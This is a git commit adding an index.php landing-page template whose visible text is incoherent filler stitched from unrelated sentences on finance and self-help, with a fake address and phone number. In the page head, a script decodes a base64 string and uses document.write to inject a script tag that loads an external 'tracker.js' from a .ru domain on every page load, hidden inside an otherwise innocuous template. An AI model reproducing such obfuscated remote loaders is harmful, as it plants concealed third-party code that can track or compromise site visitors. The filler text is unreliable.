9812ece6377203339409fda0b91302019958a954
qamjicja <78857832+qamjicja@users.noreply.github.com>
2021-02-10 15:01:19 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>The fiscal function is the main one, characteristic initially for</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl81ZXM4eng1cXk5OWpidTIyYnAiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="24u3obnby0xxsnxsvjmtf9">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="xb7od6lcqc7m800flw2k">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>The fiscal function is the main one, characteristic initially for</h1>
+	</section>
+
+
+	<section class="our-work" class="005ga7htlzc8vrz7nwn2">
+		<h3 class="title">The courtyard became his courtyard - the business t</h3>
+		<p>Here are your resources, including the opportunity to learn from each other.  They are based on a system of budgets.Some of the elements in the system of public finance include extra-budgetary funds to finance certain targeted activities (pension, medical fund, employment fund).  Commodity production is a form of social production in which products are made for exchange.  He was physically weak, short, puny, with poorly coordinated movements, for example, he swung a baseball bat before the ball was in the air.  On the one hand, it is the granting of individual firms the exclusive right to perform a certain type of activity.  This has led to a deep awareness on both sides of the extent to which previous ineffective communication is responsible for mutual misunderstandings and unrealistic expectations, and that continued Win / Win interaction can prevent further serious problems from arising.  Taxes and subsidies. </p>
+		<hr>
+
+		<ul class="grid" class="9inbrqgvjco6emfdq2">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="24u3obnby0xxsnxsvjmtf9">
+		<h3 class="title">In the course of their conversation, commu</h3>
+		<p>And people see it.  These are consequences and mistakes.  They decided to continue the conversation.  This is the relationship between people in the process of production and exchange of goods.  Combined with self-awareness, imagination and conscience give us the strength to write our own script for life. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="xb7od6lcqc7m800flw2k" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="005ga7htlzc8vrz7nwn2">
+		<h3 class="title">Before reaching our room, the employee spilled hot chocolateand</h3>
+		<p>Contribute to the success of subordinates.  In my opinion, this happened, to a large extent, due to the fact that the participants in this event were quite mature people.  Before reaching our room, the employee spilled hot chocolateand it took him a few minutes to return to the kitchen, change the napkin on the tray and pour in a new cup.  If you want to contribute, you need to make what is important to the other person as important to you as the person is to you.Your six-year-old may turn to you with some kind of nonsense, from his point of view, very important, just at the time when you are busy with work that is of paramount importance to you.  You will need your answers to work on Skill 3.  Again, this is ineffective. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="9inbrqgvjco6emfdq2" style="background-image: url(image3.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="24u3obnby0xxsnxsvjmtf9">
+		<h3 class="title">When each family member participates in a common ca</h3>
+		<p>For several years I have worked with an organization led by a very dynamic person.  Many of us do this.  Every employee of the organization should be involved in it in one form or another,not only top-level strategists, but everyone.  I must go.- But why did you turn this person into the center of your life? I asked. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="xb7od6lcqc7m800flw2k" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="005ga7htlzc8vrz7nwn2">
+		<h3 class="title">They are able to go too far and punish the</h3>
+		<p>“From the inside out” is a process, a continuous process of renewal based on natural laws governing human growth and development.  The entrepreneur receives profit from his activities in the form of income.  Most market actors act as both buyers and sellers.  The more closely our maps or paradigms are connected to these natural laws, the more accurate and functional they are.  Working together to formulate a mission inspired complete freedom of exchange.  - What do you mean “general feeling that something is missing”? Tell me specifically, what do you want from me? Express yourself more clearly so that I understand and can do something.  Commodity circulation includes two independent acts, separated in time and space. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="9inbrqgvjco6emfdq2" class="title">His self-esteem is highly variable and depends on the mood or b</h3>	
+		<p>Initially, the weight content of the monetary unit coincided with the scale of prices, which was reflected in the names of some monetary units.  4.  Monopoly is an exclusive right in a certain area of ​​the state, organization, company.  That's when we try to treat the symptoms using the tools of the Personality Ethics arsenal - like a social patch or aspirin.  In the case when the percentage change in price is equal to the change in quantity, the equality ED = 1 is set.Price elasticity of demand is usually the case for luxury goods (jewelry) and fairly expensive consumer goods (cars).  Small-scale production is often unable to use the most efficient (from a technological point of view) production equipment.  Leadership delegation provides for a clear, open understanding and shared commitment by the parties in five areas.Desired results. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="24u3obnby0xxsnxsvjmtf9">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="xb7od6lcqc7m800flw2k"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="005ga7htlzc8vrz7nwn2"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="9inbrqgvjco6emfdq2"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>113 Altenwerth View, Apt. 150, 26565, Lake Gia, Massachusetts, United States</p>
+		<p>Phone number: +95(64)167-43103</p>
+	</footer>
+
+</body>
+
+</html>
